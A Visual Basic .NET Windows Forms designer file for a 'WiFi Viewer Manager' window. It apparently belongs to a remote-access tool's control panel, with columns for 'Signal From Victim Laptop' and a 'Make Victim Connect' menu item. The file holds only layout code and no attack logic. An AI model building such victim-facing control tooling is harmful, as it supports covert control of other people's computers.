<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class wifi
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(wifi))
        Me.SkyDarkForm1 = New X_Theme.SkyDarkForm()
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MakeVictimConnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.ListBox1 = New System.Windows.Forms.ListBox()
        Me.SkyDarkForm1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'SkyDarkForm1
        '
        Me.SkyDarkForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.SkyDarkForm1.Controls.Add(Me.ListView1)
        Me.SkyDarkForm1.Controls.Add(Me.ListBox1)
        Me.SkyDarkForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SkyDarkForm1.Location = New System.Drawing.Point(0, 0)
        Me.SkyDarkForm1.Name = "SkyDarkForm1"
        Me.SkyDarkForm1.Size = New System.Drawing.Size(506, 447)
        Me.SkyDarkForm1.TabIndex = 0
        Me.SkyDarkForm1.Text = "WiFi Viewer Manager"
        '
        'ListView1
        '
        Me.ListView1.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4})
        Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.ListView1.ForeColor = System.Drawing.Color.Lime
        Me.ListView1.FullRowSelect = True
        Me.ListView1.LargeImageList = Me.ImageList1
        Me.ListView1.Location = New System.Drawing.Point(3, 25)
        Me.ListView1.Name = "ListView1"
        Me.ListView1.Size = New System.Drawing.Size(500, 419)
        Me.ListView1.SmallImageList = Me.ImageList1
        Me.ListView1.TabIndex = 11
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "WiFi Name"
        Me.ColumnHeader1.Width = 153
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "Signal  From Victim Laptop"
        Me.ColumnHeader2.Width = 139
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Secuirty Type"
        Me.ColumnHeader3.Width = 120
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Chip Type"
        Me.ColumnHeader4.Width = 82
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem, Me.MakeVictimConnectToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(249, 48)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.RefreshToolStripMenuItem.ForeColor = System.Drawing.Color.Lime
        Me.RefreshToolStripMenuItem.Image = CType(resources.GetObject("RefreshToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(248, 22)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'MakeVictimConnectToolStripMenuItem
        '
        Me.MakeVictimConnectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.MakeVictimConnectToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ButtonShadow
        Me.MakeVictimConnectToolStripMenuItem.Image = CType(resources.GetObject("MakeVictimConnectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MakeVictimConnectToolStripMenuItem.Name = "MakeVictimConnectToolStripMenuItem"
        Me.MakeVictimConnectToolStripMenuItem.Size = New System.Drawing.Size(248, 22)
        Me.MakeVictimConnectToolStripMenuItem.Text = "Make Victim Connect [Permium]"
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "10+.ico")
        Me.ImageList1.Images.SetKeyName(1, "20+.ico")
        Me.ImageList1.Images.SetKeyName(2, "40+.ico")
        Me.ImageList1.Images.SetKeyName(3, "60+.ico")
        Me.ImageList1.Images.SetKeyName(4, "80+.ico")
        Me.ImageList1.Images.SetKeyName(5, "90+.ico")
        '
        'ListBox1
        '
        Me.ListBox1.FormattingEnabled = True
        Me.ListBox1.Location = New System.Drawing.Point(123, 96)
        Me.ListBox1.Name = "ListBox1"
        Me.ListBox1.Size = New System.Drawing.Size(120, 82)
        Me.ListBox1.TabIndex = 8
        Me.ListBox1.Visible = False
        '
        'wifi
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(506, 447)
        Me.Controls.Add(Me.SkyDarkForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "wifi"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "wifi"
        Me.SkyDarkForm1.ResumeLayout(False)
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents SkyDarkForm1 As X_Theme.SkyDarkForm
    Friend WithEvents ListBox1 As System.Windows.Forms.ListBox
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents ListView1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents MakeVictimConnectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
End Class
